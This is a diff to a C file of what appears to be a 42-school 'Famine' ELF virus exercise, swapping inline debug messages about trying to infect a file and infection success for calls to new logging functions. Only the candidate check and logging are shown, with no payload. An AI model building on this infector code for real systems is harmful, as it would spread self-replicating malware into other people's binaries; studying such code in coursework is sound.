@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/19 01:46:42 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/20 23:11:32 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,6 +16,7 @@
 #include "accessors.h"
 #include "errors.h"
 #include "utils.h"
+#include "log.h"
 
 static bool	elf64_identifier(const Elf64_Ehdr *hdr)
 {
@@ -36,12 +37,7 @@ inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
 	Elf64_Ehdr	elf64_hdr;
 	int		fd = famine_open(file, O_RDONLY);
 
-#ifdef DEBUG
-	PD_ARRAY(char,_log_name,'\033','[','3','6','m','[','L','O','G',']',' ','t','r','y','i','n','g',' ','t','o',' ','i','n','f','e','c','t',':',' ','\033','[','0','m',0);
-	ft_putstr(_log_name);
-	ft_putstr(file);
-	ft_putchar('\n');
-#endif
+	log_try_infecting(file);
 
 	if (fd < 0)
 	{
@@ -75,10 +71,7 @@ inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
 	free_accessor(&food.original_safe);
 	free_accessor(&food.clone_safe);
 
-#ifdef DEBUG
-	PD_ARRAY(char,_log_success,'\033','[','3','2','m','[','L','O','G',']',' ','i','n','f','e','c','t','i','o','n',' ','s','u','c','c','e','e','d','e','d','\033','[','0','m','\n',0);
-	ft_putstr(_log_success);
-#endif
+	log_success();
 
 	return true;
 }
